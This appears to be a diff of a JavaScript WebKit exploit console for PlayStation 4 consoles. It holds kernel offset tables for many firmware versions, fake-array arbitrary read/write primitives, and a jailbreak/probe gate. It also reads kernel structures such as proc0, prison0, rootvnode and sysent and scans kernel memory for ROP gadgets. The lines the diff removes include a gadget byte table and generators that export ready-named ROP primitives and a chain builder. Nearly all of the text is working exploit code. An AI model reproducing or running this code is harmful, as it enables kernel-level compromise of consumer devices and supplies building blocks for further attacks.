+(function initUI() {
+    try {
+        document.getElementById("btnCopy").addEventListener("click", copyReport);
+        document.getElementById("btnClear").addEventListener("click", clearLog);
+        document.getElementById("chkAutoScroll").addEventListener("change", function (ev) {
+            LOG.autoScroll = !!ev.target.checked;
+        });
+        document.getElementById("btnToggleConsole").addEventListener("click", function () {
+            document.getElementById("consolePanel").classList.toggle("collapsed");
+        });
+        document.getElementById("consoleHead").addEventListener("click", function () {
+            document.getElementById("consolePanel").classList.toggle("collapsed");
+        });
+    } catch (_) {}
+})();
+
 /* ============================================================
- *  EXPLOIT (single-shot, no auto-retry)
+ *  EXPLOIT
  * ============================================================ */
 
-var headerMsg = "mansoor0x + OptiTronOffical [probe build]";
-var headerBorder = "=".repeat(50);
-var headerPrinted = false;
-
-function printHeader() {
-    if (headerPrinted) return;
-    headerPrinted = true;
-    logLine(headerBorder, "info");
-    logLine(" " + headerMsg, "info");
-    logLine(" Credits:", "info");
-    logLine("   mansoor0x       - base HTML script", "info");
-    logLine("   primehat06-wq   - uploaded to GitHub / found repo", "info");
-    logLine("   OptiTronOffical - vibe coding, testing, repo dorking", "info");
-    logLine(" Mode: post-R/W kernel probe (gadget/ROP/symbol enumeration)", "info");
-    logLine(" Output: .mjs modules (kernel-info / gadgets / rop / index)", "info");
-    logLine(headerBorder, "info");
-}
-
-// ========== PS4 OFFSETS ==========
 var PS4_OFFSETS = {
     "5.00": { evf: 0x7B3ED4, prison0: 0x10986A0, rootvnode: 0x22C19F0, sysent: 0x1084200, jmp: 0x13460 },
     "5.03": { evf: 0x7B42E4, prison0: 0x10986A0, rootvnode: 0x22C1A70, sysent: 0x1084200, jmp: 0x13460 },
@@ -496,7 +910,6 @@ var PS4_OFFSETS = {
     "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 }
 };
 
-// ========== PARAMETERS ==========
 var Q = new URLSearchParams(location.search);
 var requestedDrain = parseInt(Q.get("n") || "128", 10);
 var DRAIN_COUNT = isFinite(requestedDrain) ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
@@ -584,7 +997,6 @@ var compositionError = null;
 var globalFakeArray = null;
 var testRun = false;
 
-// ========== FIRMWARE DETECTION ==========
 var FW_LABEL = (function() {
     var m = /PlayStation 4\/(\d+)\.(\d+)/.exec(navigator.userAgent);
     if (m) return m[1] + "." + m[2].padStart(2, "0");
@@ -596,7 +1008,6 @@ var FW_LABEL = (function() {
 
 var fwOffsets = PS4_OFFSETS[FW_LABEL] || PS4_OFFSETS[""];
 
-// ========== UTILITY ==========
 function mark(tag, extra) {
     if (!headerPrinted) printHeader();
     seq++;
@@ -610,9 +1021,7 @@ function hex(value) {
     return "0x" + value.toString(16);
 }
 
-function buffer(size) {
-    return new ArrayBuffer(size);
-}
+function buffer(size) { return new ArrayBuffer(size); }
 
 function uint32At(bytes, offset) {
     return bytes[offset] + bytes[offset+1]*0x100 + bytes[offset+2]*0x10000 + bytes[offset+3]*0x1000000;
@@ -660,7 +1069,6 @@ function failTerminal(reason, detail) {
     try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
 }
 
-// ========== EXPLOIT CORE ==========
 function buildFakeHost() {
     rwBuffer = new ArrayBuffer(0x100);
     rwView = new Uint8Array(rwBuffer);
@@ -917,6 +1325,21 @@ function dumpHex(bytes) {
     return out;
 }
 
+function populateRWCard() {
+    setBadge("rw", "READY", "ok");
+    setCardState("rw", "ok");
+    setRow("rw", "state",   "PASS", "ok");
+    setRow("rw", "read",    readObserved ? "PASS" : "FAIL", readObserved ? "ok" : "bad");
+    setRow("rw", "write",   writeObserved ? "PASS" : "FAIL", writeObserved ? "ok" : "bad");
+    setRow("rw", "restore", restoreObserved ? "PASS" : "FAIL", restoreObserved ? "ok" : "bad");
+    setRow("rw", "host",    hex(hostAddress));
+    setRow("rw", "fake",    hex(fakeAddress));
+    setRow("rw", "target",  hex(targetAddress));
+    setRow("rw", "sid",     hex(uint32At(rwHeader, 0)));
+    setRow("rw", "rwhdr",   dumpHex(rwHeader));
+    setRow("rw", "tghdr",   dumpHex(targetHeader));
+}
+
 function reportComposition() {
     if (compositionState < 0) {
         mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW", (compositionError && compositionError.name) + ":" + String(compositionError && compositionError.message).slice(0, 80));
@@ -969,13 +1392,19 @@ function reportComposition() {
         mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
         try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
 
+        populateRWCard();
+
         if (!testRun) {
             testRun = true;
             if (RUN_JAILBREAK) {
                 mark("JAILBREAK-GATE", "explicitly-enabled-by-url-param");
+                setBadge("gadgets", "JB MODE", "warn");
+                setCardState("gadgets", "warn");
                 setTimeout(runJailbreak, 500);
             } else {
                 mark("PROBE-GATE", "auto-starting-kernel-probe (no jailbreak)");
+                setBadge("gadgets", "PROBING…", "run");
+                setCardState("gadgets", "warn");
                 setTimeout(runProbe, 500);
             }
         }
@@ -1077,7 +1506,9 @@ function beginComposition() {
     runGroomAndLoad();
 }
 
-// ========== R/W PRIMITIVES ==========
+/* ============================================================
+ *  R/W PRIMITIVES
+ * ============================================================ */
 function read64(addr) {
     if (!globalFakeArray) return 0n;
     var oldVec = [];
@@ -1111,8 +1542,6 @@ function write64(addr, value) {
     for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
 }
 
-/* Bulk byte reader — points the fake array vector at `addr` and pulls
- * `count` bytes out in 8-byte strides. Restores the original vector. */
 function readBytes(addr, count) {
     var out = new Uint8Array(count);
     if (!globalFakeArray) return out;
@@ -1136,105 +1565,11 @@ function readBytes(addr, count) {
     return out;
 }
 
-// ========== GADGET / ROP PATTERN TABLE ==========
-var GADGETS = [
-    { name: "pop rdi ; ret",              bytes: [0x5F, 0xC3] },
-    { name: "pop rsi ; ret",              bytes: [0x5E, 0xC3] },
-    { name: "pop rdx ; ret",              bytes: [0x5A, 0xC3] },
-    { name: "pop rcx ; ret",              bytes: [0x59, 0xC3] },
-    { name: "pop rax ; ret",              bytes: [0x58, 0xC3] },
-    { name: "pop rbx ; ret",              bytes: [0x5B, 0xC3] },
-    { name: "pop rsp ; ret",              bytes: [0x5C, 0xC3] },
-    { name: "pop rbp ; ret",              bytes: [0x5D, 0xC3] },
-    { name: "pop r8  ; ret",              bytes: [0x41, 0x58, 0xC3] },
-    { name: "pop r9  ; ret",              bytes: [0x41, 0x59, 0xC3] },
-    { name: "pop r10 ; ret",              bytes: [0x41, 0x5A, 0xC3] },
-    { name: "pop r11 ; ret",              bytes: [0x41, 0x5B, 0xC3] },
-    { name: "pop r12 ; ret",              bytes: [0x41, 0x5C, 0xC3] },
-    { name: "pop r13 ; ret",              bytes: [0x41, 0x5D, 0xC3] },
-    { name: "pop r14 ; ret",              bytes: [0x41, 0x5E, 0xC3] },
-    { name: "pop r15 ; ret",              bytes: [0x41, 0x5F, 0xC3] },
-    { name: "leave ; ret",                bytes: [0xC9, 0xC3] },
-    { name: "pop rsp ; pop rbp ; ret",    bytes: [0x5C, 0x5D, 0xC3] },
-    { name: "add rsp, 0x28 ; ret",        bytes: [0x48, 0x83, 0xC4, 0x28, 0xC3] },
-    { name: "add rsp, 0x38 ; ret",        bytes: [0x48, 0x83, 0xC4, 0x38, 0xC3] },
-    { name: "sub rsp, 0x28 ; ret",        bytes: [0x48, 0x83, 0xEC, 0x28, 0xC3] },
-    { name: "swapgs ; ret",               bytes: [0x0F, 0x01, 0xF8, 0xC3] },
-    { name: "swapgs ; iretq",             bytes: [0x0F, 0x01, 0xF8, 0x48, 0xCF] },
-    { name: "iretq",                      bytes: [0x48, 0xCF] },
-    { name: "sysretq",                    bytes: [0x48, 0x0F, 0x07] },
-    { name: "sysret",                     bytes: [0x0F, 0x07] },
-    { name: "mov rdi, rax ; ...",         bytes: [0x48, 0x89, 0xC7] },
-    { name: "mov rdi, rsp ; ...",         bytes: [0x48, 0x89, 0xE7] },
-    { name: "xchg rax, rsp ; ret",        bytes: [0x48, 0x94, 0xC3] },
-    { name: "xchg edi, eax",              bytes: [0x97] },
-    { name: "mov cr4, rdi ; ret",         bytes: [0x0F, 0x22, 0xE7, 0xC3] },
-    { name: "mov cr4, rax",               bytes: [0x0F, 0x22, 0xE0] },
-    { name: "mov cr0, rdi",               bytes: [0x0F, 0x22, 0xC7] },
-    { name: "mov cr3, rdi",               bytes: [0x0F, 0x22, 0xDF] },
-    { name: "ret",                        bytes: [0xC3] },
-    { name: "nop ; ret",                  bytes: [0x90, 0xC3] },
-    { name: "cli ; ret",                  bytes: [0xFA, 0xC3] },
-    { name: "sti ; ret",                  bytes: [0xFB, 0xC3] },
-    { name: "wrmsr",                      bytes: [0x0F, 0x30] },
-    { name: "rdmsr",                      bytes: [0x0F, 0x32] },
-    { name: "pushfq ; pop rax",           bytes: [0x9C, 0x58] },
-    { name: "popfq",                      bytes: [0x9D] },
-    { name: "syscall",                    bytes: [0x0F, 0x05] },
-    { name: "sysenter",                   bytes: [0x0F, 0x34] },
-    { name: "int 0x80",                   bytes: [0xCD, 0x80] },
-    { name: "int3 ; ret",                 bytes: [0xCC, 0xC3] },
-    { name: "jmp rax",                    bytes: [0xFF, 0xE0] },
-    { name: "jmp rcx",                    bytes: [0xFF, 0xE1] },
-    { name: "jmp rdx",                    bytes: [0xFF, 0xE2] },
-    { name: "jmp rsi",                    bytes: [0xFF, 0xE6] },
-    { name: "jmp rdi",                    bytes: [0xFF, 0xE7] },
-    { name: "call rax",                   bytes: [0xFF, 0xD0] },
-    { name: "call rsi",                   bytes: [0xFF, 0xD6] },
-    { name: "call rdi",                   bytes: [0xFF, 0xD7] }
-];
-
 /* ============================================================
- *  PROBE ACCUMULATOR + .MJS EXPORT
+ *  GADGET SCANNER
  * ============================================================ */
-var PROBE = {
-    fw: "",
-    revision: REVISION,
-    started: 0,
-    finished: 0,
-    kbase: 0n,
-    kbaseHeader: null,
-    offsets: {},         // { evf, prison0, rootvnode, sysent, jmp } — Numbers
-    addrs: {},           // resolved absolute addresses — BigInt
-    structs: {           // live runtime values
-        evfValue: null,
-        prison0Value: null,
-        rootvnodeValue: null,
-        sysent661: null, // { addr, narg, call, thrcnt }
-        proc0: null      // { addr, pid, ucred, uid, gid, prison }
-    },
-    sysentDump: [],      // array of hex-row strings
-    windowHits: {},      // { label: [ { name, addr } ] }
-    errors: []
-};
-
-function bigHex(v) {
-    try {
-        if (typeof v === "bigint") return "0x" + v.toString(16) + "n";
-        if (typeof v === "number" && isFinite(v)) return "0x" + Math.floor(v).toString(16) + "n";
-    } catch (_) {}
-    return "null";
-}
-function numHex(v) {
-    try { return "0x" + Number(v).toString(16); } catch (_) { return "0x0"; }
-}
-function bigHexOrNull(v) {
-    if (v === null || v === undefined) return "null";
-    return bigHex(v);
-}
-
 function scanGadgetsInWindow(startAddr, windowBytes) {
-    var hits = [];
+    var found = 0;
     try {
         var buf = readBytes(startAddr, windowBytes);
         for (var g = 0; g < GADGETS.length; g++) {
@@ -1246,324 +1581,51 @@ function scanGadgetsInWindow(startAddr, windowBytes) {
                     if (buf[i + j] !== gd.bytes[j]) { ok = false; break; }
                 }
                 if (ok) {
-                    hits.push({ name: gd.name, addr: BigInt(startAddr) + BigInt(i) });
+                    var addr = BigInt(startAddr) + BigInt(i);
+                    addGadgetHit(gd.cat, gd.name, hex(addr));
+                    found++;
                     break;
                 }
             }
         }
     } catch (err) {
         mark("SCAN-ERROR", hex(startAddr) + ":" + (err && err.message ? err.message.slice(0, 60) : "?"));
-        PROBE.errors.push("SCAN-ERROR " + hex(startAddr));
     }
-    return hits;
+    return found;
 }
 
 function dumpWindow(label, startAddr, windowBytes) {
     mark(label + "-START", hex(startAddr) + "-len=0x" + windowBytes.toString(16));
-    var hits = scanGadgetsInWindow(startAddr, windowBytes);
-    PROBE.windowHits[label] = hits;
-    if (hits.length === 0) {
-        mark(label + "-NONE", "no patterns matched");
-        return hits;
-    }
-    for (var i = 0; i < hits.length; i++) {
-        mark("GADGET", hits[i].name + " @ " + hex(hits[i].addr) + " [" + label + "]");
-    }
-    return hits;
+    var found = scanGadgetsInWindow(startAddr, windowBytes);
+    mark(label + "-DONE", "patterns-found=" + found);
+    renderGadgets();
+    return found;
 }
 
-/* -------- .mjs content builders -------- */
-
-function buildKernelInfoMjs() {
-    var L = [];
-    L.push("// PS4 Kernel Info — auto-generated by WebKit Exploit Console");
-    L.push("// Firmware   : " + (PROBE.fw || "(undetected)"));
-    L.push("// Revision   : " + PROBE.revision);
-    L.push("// Generated  : " + new Date(PROBE.finished || Date.now()).toISOString());
-    L.push("");
-    L.push("export const FIRMWARE = " + JSON.stringify(PROBE.fw || "") + ";");
-    L.push("export const REVISION = " + JSON.stringify(PROBE.revision) + ";");
-    L.push("export const KERNEL_BASE = " + bigHex(PROBE.kbase) + ";");
-    L.push("");
-    L.push("// Firmware offset table (relative to KERNEL_BASE)");
-    L.push("export const OFFSETS = {");
-    var offKeys = ["evf", "prison0", "rootvnode", "sysent", "jmp"];
-    for (var i = 0; i < offKeys.length; i++) {
-        var k = offKeys[i];
-        L.push("    " + k + ": " + numHex(PROBE.offsets[k] || 0) + ",");
-    }
-    L.push("};");
-    L.push("");
-    L.push("// Absolute kernel addresses");
-    L.push("export const ADDRESSES = {");
-    for (var j = 0; j < offKeys.length; j++) {
-        var kk = offKeys[j];
-        if (PROBE.addrs[kk] !== undefined) L.push("    " + kk + ": " + bigHex(PROBE.addrs[kk]) + ",");
-    }
-    L.push("};");
-    L.push("");
-    L.push("// Live values read from kernel memory");
-    L.push("export const RUNTIME = {");
-    L.push("    proc0:      " + bigHexOrNull(PROBE.structs.evfValue) + ",");
-    L.push("    prison0:    " + bigHexOrNull(PROBE.structs.prison0Value) + ",");
-    L.push("    rootvnode:  " + bigHexOrNull(PROBE.structs.rootvnodeValue) + ",");
-    L.push("};");
-    L.push("");
-    if (PROBE.structs.sysent661) {
-        var s = PROBE.structs.sysent661;
-        L.push("export const SYSENT_661 = {");
-        L.push("    addr:   " + bigHex(s.addr) + ",");
-        L.push("    narg:   " + bigHex(s.narg) + ",");
-        L.push("    call:   " + bigHex(s.call) + ",");
-        L.push("    thrcnt: " + bigHex(s.thrcnt) + ",");
-        L.push("};");
-        L.push("");
-    }
-    if (PROBE.structs.proc0) {
-        var p = PROBE.structs.proc0;
-        L.push("export const PROC0 = {");
-        L.push("    addr:   " + bigHex(p.addr) + ",");
-        if (p.pid    !== null) L.push("    pid:    " + bigHex(p.pid) + ",");
-        if (p.ucred  !== null) L.push("    ucred:  " + bigHex(p.ucred) + ",");
-        if (p.uid    !== null) L.push("    uid:    " + bigHex(p.uid) + ",");
-        if (p.gid    !== null) L.push("    gid:    " + bigHex(p.gid) + ",");
-        if (p.prison !== null) L.push("    prison: " + bigHex(p.prison) + ",");
-        L.push("};");
-        L.push("");
-    }
-    if (PROBE.kbaseHeader) {
-        L.push("export const KBASE_HEADER = {");
-        L.push("    q0: " + bigHex(PROBE.kbaseHeader[0]) + ",");
-        L.push("    q1: " + bigHex(PROBE.kbaseHeader[1]) + ",");
-        L.push("    q2: " + bigHex(PROBE.kbaseHeader[2]) + ",");
-        L.push("    q3: " + bigHex(PROBE.kbaseHeader[3]) + ",");
-        L.push("};");
-        L.push("");
-    }
-    if (PROBE.sysentDump.length) {
-        L.push("export const SYSENT_DUMP = [");
-        for (var d = 0; d < PROBE.sysentDump.length; d++) {
-            L.push("    " + JSON.stringify(PROBE.sysentDump[d]) + ",");
-        }
-        L.push("].join(\"\\n\");");
-        L.push("");
-    }
-    L.push("// Full firmware offset table (all known firmwares)");
-    L.push("export const FULL_OFFSET_TABLE = {");
-    for (var fw in PS4_OFFSETS) {
-        var row = PS4_OFFSETS[fw];
-        L.push("    " + JSON.stringify(fw) + ": { evf: " + numHex(row.evf) + ", prison0: " + numHex(row.prison0) +
-               ", rootvnode: " + numHex(row.rootvnode) + ", sysent: " + numHex(row.sysent) + ", jmp: " + numHex(row.jmp) + " },");
-    }
-    L.push("};");
-    L.push("");
-    L.push("export default { FIRMWARE, KERNEL_BASE, OFFSETS, ADDRESSES, RUNTIME };");
-    return L.join("\n");
-}
-
-function buildGadgetsMjs() {
-    var L = [];
-    L.push("// PS4 Gadgets — auto-generated by WebKit Exploit Console");
-    L.push("// Firmware   : " + (PROBE.fw || "(undetected)"));
-    L.push("// Generated  : " + new Date(PROBE.finished || Date.now()).toISOString());
-    L.push("");
-    L.push("export const FIRMWARE = " + JSON.stringify(PROBE.fw || "") + ";");
-    L.push("export const KERNEL_BASE = " + bigHex(PROBE.kbase) + ";");
-    L.push("");
-    L.push("// Hits grouped by scan window");
-    L.push("export const WINDOWS = {");
-    for (var label in PROBE.windowHits) {
-        L.push("    " + JSON.stringify(label) + ": [");
-        var arr = PROBE.windowHits[label];
-        for (var i = 0; i < arr.length; i++) {
-            L.push("        { name: " + JSON.stringify(arr[i].name) + ", addr: " + bigHex(arr[i].addr) + " },");
-        }
-        L.push("    ],");
-    }
-    L.push("};");
-    L.push("");
-    L.push("// Flat lookup by name (first hit across all windows)");
-    L.push("export const GADGETS = {");
-    var flat = {};
-    for (var lb in PROBE.windowHits) {
-        var a = PROBE.windowHits[lb];
-        for (var k = 0; k < a.length; k++) {
-            if (!(a[k].name in flat)) flat[a[k].name] = a[k].addr;
-        }
-    }
-    for (var nm in flat) {
-        L.push("    " + JSON.stringify(nm) + ": " + bigHex(flat[nm]) + ",");
-    }
-    L.push("};");
-    L.push("");
-    L.push("export default { FIRMWARE, KERNEL_BASE, WINDOWS, GADGETS };");
-    return L.join("\n");
-}
-
-function buildRopMjs() {
-    var flat = {};
-    for (var lb in PROBE.windowHits) {
-        var a = PROBE.windowHits[lb];
-        for (var k = 0; k < a.length; k++) {
-            if (!(a[k].name in flat)) flat[a[k].name] = a[k].addr;
-        }
-    }
-    function pick(name) { return (name in flat) ? bigHex(flat[name]) : "null"; }
-
-    var L = [];
-    L.push("// PS4 ROP primitives — auto-generated by WebKit Exploit Console");
-    L.push("// Firmware   : " + (PROBE.fw || "(undetected)"));
-    L.push("// Generated  : " + new Date(PROBE.finished || Date.now()).toISOString());
-    L.push("");
-    L.push("export const FIRMWARE = " + JSON.stringify(PROBE.fw || "") + ";");
-    L.push("export const KERNEL_BASE = " + bigHex(PROBE.kbase) + ";");
-    L.push("");
-    L.push("// Ready-named ROP primitives (null if not located on this FW)");
-    L.push("export const ROP = {");
-    L.push("    popRdi:      " + pick("pop rdi ; ret") + ",");
-    L.push("    popRsi:      " + pick("pop rsi ; ret") + ",");
-    L.push("    popRdx:      " + pick("pop rdx ; ret") + ",");
-    L.push("    popRcx:      " + pick("pop rcx ; ret") + ",");
-    L.push("    popRax:      " + pick("pop rax ; ret") + ",");
-    L.push("    popRbx:      " + pick("pop rbx ; ret") + ",");
-    L.push("    popRsp:      " + pick("pop rsp ; ret") + ",");
-    L.push("    popRbp:      " + pick("pop rbp ; ret") + ",");
-    L.push("    popR8:       " + pick("pop r8  ; ret") + ",");
-    L.push("    popR9:       " + pick("pop r9  ; ret") + ",");
-    L.push("    popR10:      " + pick("pop r10 ; ret") + ",");
-    L.push("    popR11:      " + pick("pop r11 ; ret") + ",");
-    L.push("    popR12:      " + pick("pop r12 ; ret") + ",");
-    L.push("    popR13:      " + pick("pop r13 ; ret") + ",");
-    L.push("    popR14:      " + pick("pop r14 ; ret") + ",");
-    L.push("    popR15:      " + pick("pop r15 ; ret") + ",");
-    L.push("    leaveRet:    " + pick("leave ; ret") + ",");
-    L.push("    ret:         " + pick("ret") + ",");
-    L.push("    nopRet:      " + pick("nop ; ret") + ",");
-    L.push("    swapgsRet:   " + pick("swapgs ; ret") + ",");
-    L.push("    swapgsIretq: " + pick("swapgs ; iretq") + ",");
-    L.push("    iretq:       " + pick("iretq") + ",");
-    L.push("    sysretq:     " + pick("sysretq") + ",");
-    L.push("    movCr4Rdi:   " + pick("mov cr4, rdi ; ret") + ",");
-    L.push("    movCr4Rax:   " + pick("mov cr4, rax") + ",");
-    L.push("    movCr0Rdi:   " + pick("mov cr0, rdi") + ",");
-    L.push("    movCr3Rdi:   " + pick("mov cr3, rdi") + ",");
-    L.push("    xchgRaxRsp:  " + pick("xchg rax, rsp ; ret") + ",");
-    L.push("    addRsp28:    " + pick("add rsp, 0x28 ; ret") + ",");
-    L.push("    subRsp28:    " + pick("sub rsp, 0x28 ; ret") + ",");
-    L.push("    cliRet:      " + pick("cli ; ret") + ",");
-    L.push("    stiRet:      " + pick("sti ; ret") + ",");
-    L.push("    wrmsr:       " + pick("wrmsr") + ",");
-    L.push("    rdmsr:       " + pick("rdmsr") + ",");
-    L.push("    syscall:     " + pick("syscall") + ",");
-    L.push("    sysenter:    " + pick("sysenter") + ",");
-    L.push("    int80:       " + pick("int 0x80") + ",");
-    L.push("    jmpRax:      " + pick("jmp rax") + ",");
-    L.push("    jmpRcx:      " + pick("jmp rcx") + ",");
-    L.push("    jmpRdx:      " + pick("jmp rdx") + ",");
-    L.push("    jmpRsi:      " + pick("jmp rsi") + ",");
-    L.push("    jmpRdi:      " + pick("jmp rdi") + ",");
-    L.push("    callRax:     " + pick("call rax") + ",");
-    L.push("    callRsi:     " + pick("call rsi") + ",");
-    L.push("    callRdi:     " + pick("call rdi") + ",");
-    L.push("};");
-    L.push("");
-    L.push("// Build a ROP chain from an array of {gadget, args} steps.");
-    L.push("//   chain([");
-    L.push("//     { g: ROP.popRdi, a: [0xdeadbeefn] },");
-    L.push("//     { g: ROP.ret },");
-    L.push("//   ])");
-    L.push("export function chain(steps) {");
-    L.push("    const out = [];");
-    L.push("    for (const s of steps) {");
-    L.push("        if (s.g == null) throw new Error('missing gadget in step');");
-    L.push("        out.push(s.g);");
-    L.push("        if (s.a) for (const v of s.a) out.push(v);");
-    L.push("    }");
-    L.push("    return out;");
-    L.push("}");
-    L.push("");
-    L.push("export default { FIRMWARE, KERNEL_BASE, ROP, chain };");
-    return L.join("\n");
-}
-
-function buildIndexMjs(filenames) {
-    var L = [];
-    L.push("// PS4 Probe Manifest — auto-generated");
-    L.push("// Firmware   : " + (PROBE.fw || "(undetected)"));
-    L.push("// Generated  : " + new Date(PROBE.finished || Date.now()).toISOString());
-    L.push("//");
-    L.push("// Drop the four .mjs files in the same directory and import this one.");
-    L.push("");
-    L.push("export * from " + JSON.stringify(filenames.kernel) + ";");
-    L.push("export * from " + JSON.stringify(filenames.gadgets) + ";");
-    L.push("export * from " + JSON.stringify(filenames.rop) + ";");
-    L.push("");
-    return L.join("\n");
-}
-
-var mjsSavedOnce = false;
-function saveProbeMjs() {
-    if (!PROBE.finished) {
-        PROBE.finished = Date.now();
-    }
-    var fw = (PROBE.fw || "unknown").replace(/[^0-9a-zA-Z.]+/g, "_");
-    var stamp = new Date(PROBE.finished).toISOString().replace(/[:.]/g, "-").slice(0, 19);
-    var names = {
-        kernel:  "ps4-kernel-info-" + fw + "-" + stamp + ".mjs",
-        gadgets: "ps4-gadgets-" + fw + "-" + stamp + ".mjs",
-        rop:     "ps4-rop-" + fw + "-" + stamp + ".mjs",
-        index:   "ps4-probe-index-" + fw + "-" + stamp + ".mjs"
-    };
-
-    var kTxt = buildKernelInfoMjs();
-    var gTxt = buildGadgetsMjs();
-    var rTxt = buildRopMjs();
-    var iTxt = buildIndexMjs({ kernel: names.kernel, gadgets: names.gadgets, rop: names.rop });
-
-    // Browsers throttle simultaneous downloads — stagger them.
-    var queue = [
-        [names.kernel,  kTxt],
-        [names.gadgets, gTxt],
-        [names.rop,     rTxt],
-        [names.index,   iTxt]
-    ];
-    (function next(i) {
-        if (i >= queue.length) {
-            mark("MJS-SAVED", "files=" + queue.length + "-fw=" + (PROBE.fw || "?"));
-            return;
-        }
-        var item = queue[i];
-        if (downloadText(item[0], item[1], "text/javascript;charset=utf-8")) {
-            mark("MJS-FILE", item[0] + "-bytes=" + item[1].length);
-        }
-        setTimeout(function () { next(i + 1); }, 350);
-    })(0);
-
-    mjsSavedOnce = true;
-}
-
-// ========== KERNEL PROBE (default post-R/W action) ==========
+/* ============================================================
+ *  KERNEL PROBE (default post-R/W)
+ * ============================================================ */
 function runProbe() {
-    PROBE.started = Date.now();
-    PROBE.fw = FW_LABEL || "";
-    PROBE.revision = REVISION;
-    PROBE.windowHits = {};
-    PROBE.errors = [];
-
     mark("===== KERNEL PROBE START =====", "fw=" + FW_LABEL + " rev=" + REVISION);
 
     try {
         var kbase = 0xffffffff80000000n;
-        PROBE.kbase = kbase;
         mark("KBASE-ASSUMED", hex(kbase));
 
+        setRow("kbase", "base", hex(kbase));
+        setBadge("kbase", "READY", "ok");
+        setCardState("kbase", "ok");
+
         try {
-            var hdrA = read64(kbase);
-            var hdrB = read64(kbase + 8n);
-            var hdrC = read64(kbase + 16n);
-            var hdrD = read64(kbase + 24n);
-            PROBE.kbaseHeader = [hdrA, hdrB, hdrC, hdrD];
-            mark("KBASE-HDR", "q0=" + hex(hdrA) + " q1=" + hex(hdrB) + " q2=" + hex(hdrC) + " q3=" + hex(hdrD));
+            var h0 = read64(kbase);
+            var h1 = read64(kbase + 8n);
+            var h2 = read64(kbase + 16n);
+            var h3 = read64(kbase + 24n);
+            setRow("kbase", "q0", hex(h0));
+            setRow("kbase", "q1", hex(h1));
+            setRow("kbase", "q2", hex(h2));
+            setRow("kbase", "q3", hex(h3));
+            mark("KBASE-HDR", "q0=" + hex(h0) + " q1=" + hex(h1) + " q2=" + hex(h2) + " q3=" + hex(h3));
         } catch (_) {}
 
         var evf       = fwOffsets.evf;
@@ -1572,92 +1634,86 @@ function runProbe() {
         var sysent    = fwOffsets.sysent;
         var jmp       = fwOffsets.jmp;
 
-        PROBE.offsets = { evf: evf, prison0: prison0, rootvnode: rootvnode, sysent: sysent, jmp: jmp };
-
         var evfAddr = kbase + BigInt(evf);
-        var prisonAddr = kbase + BigInt(prison0);
-        var rootAddr   = kbase + BigInt(rootvnode);
-        var sysentAddr = kbase + BigInt(sysent);
-        var jmpAddr    = kbase + BigInt(jmp);
-
-        PROBE.addrs = {
-            evf: evfAddr,
-            prison0: prisonAddr,
-            rootvnode: rootAddr,
-            sysent661: sysentAddr,
-            jmpRsi: jmpAddr
-        };
-
-        // -------- EVF / proc0 --------
-        var evfVal = read64(evfAddr);
-        PROBE.structs.evfValue = evfVal;
+        var evfVal  = read64(evfAddr);
+        setRow("evf", "addr",  hex(evfAddr));
+        setRow("evf", "proc0", hex(evfVal));
+        setBadge("evf", "OK", "ok");
+        setCardState("evf", "ok");
         mark("EVF", "addr=" + hex(evfAddr) + "-proc0=" + hex(evfVal));
 
-        // -------- prison0 --------
-        var prisonVal = read64(prisonAddr);
-        PROBE.structs.prison0Value = prisonVal;
+        var prisonAddr = kbase + BigInt(prison0);
+        var prisonVal  = read64(prisonAddr);
+        setRow("prison", "addr",  hex(prisonAddr));
+        setRow("prison", "value", hex(prisonVal));
+        setBadge("prison", "OK", "ok");
+        setCardState("prison", "ok");
         mark("PRISON0", "addr=" + hex(prisonAddr) + "-value=" + hex(prisonVal));
 
-        // -------- rootvnode --------
-        var rootVal = read64(rootAddr);
-        PROBE.structs.rootvnodeValue = rootVal;
+        var rootAddr = kbase + BigInt(rootvnode);
+        var rootVal  = read64(rootAddr);
+        setRow("root", "addr",  hex(rootAddr));
+        setRow("root", "value", hex(rootVal));
+        setBadge("root", "OK", "ok");
+        setCardState("root", "ok");
         mark("ROOTVNODE", "addr=" + hex(rootAddr) + "-value=" + hex(rootVal));
 
-        // -------- sysent[661] --------
-        var sy_narg   = read64(sysentAddr);
-        var sy_call   = read64(sysentAddr + 8n);
-        var sy_thrcnt = read64(sysentAddr + 0x2Cn);
-        PROBE.structs.sysent661 = { addr: sysentAddr, narg: sy_narg, call: sy_call, thrcnt: sy_thrcnt };
+        var sysentAddr = kbase + BigInt(sysent);
+        var sy_narg    = read64(sysentAddr);
+        var sy_call    = read64(sysentAddr + 8n);
+        var sy_thrcnt  = read64(sysentAddr + 0x2Cn);
+        setRow("sysent", "addr",   hex(sysentAddr));
+        setRow("sysent", "narg",   hex(sy_narg));
+        setRow("sysent", "call",   hex(sy_call));
+        setRow("sysent", "thrcnt", hex(sy_thrcnt));
+        setBadge("sysent", "OK", "ok");
+        setCardState("sysent", "ok");
         mark("SYSENT-661", "addr=" + hex(sysentAddr));
         mark("SYSENT-661-NARG", hex(sy_narg));
         mark("SYSENT-661-CALL", hex(sy_call));
         mark("SYSENT-661-THRCNT", hex(sy_thrcnt));
 
-        // -------- known jmp gadget --------
+        var jmpAddr  = kbase + BigInt(jmp);
         var jmpBytes = read64(jmpAddr);
+        setRow("sysent", "jmp", hex(jmpAddr) + "  /  " + hex(jmpBytes));
         mark("JMP-RSI-KNOWN", "addr=" + hex(jmpAddr) + "-bytes=" + hex(jmpBytes));
 
-        // -------- sysent hex dump --------
-        var dump = [];
-        for (var off = 0; off < 0x100; off += 0x20) {
-            var row = "+" + ("000" + off.toString(16)).slice(-3) + ":";
-            for (var q = 0; q < 0x20; q += 8) {
-                var v = read64(sysentAddr + BigInt(off + q));
-                var s = v.toString(16);
-                while (s.length < 16) s = "0" + s;
-                row += " " + s;
-            }
-            dump.push(row);
-        }
-        PROBE.sysentDump = dump.slice();
-        mark("SYSENT-DUMP", dump.join("\n"));
-
-        // -------- proc0 chain --------
         if (evfVal > 0xffff000000000000n && evfVal < 0xffffffffffffffffn) {
-            PROBE.structs.proc0 = { addr: evfVal, pid: null, ucred: null, uid: null, gid: null, prison: null };
             try {
                 var pid   = read64(evfVal + 0xBCn);
                 var ucred = read64(evfVal + 0x40n);
-                PROBE.structs.proc0.pid = pid;
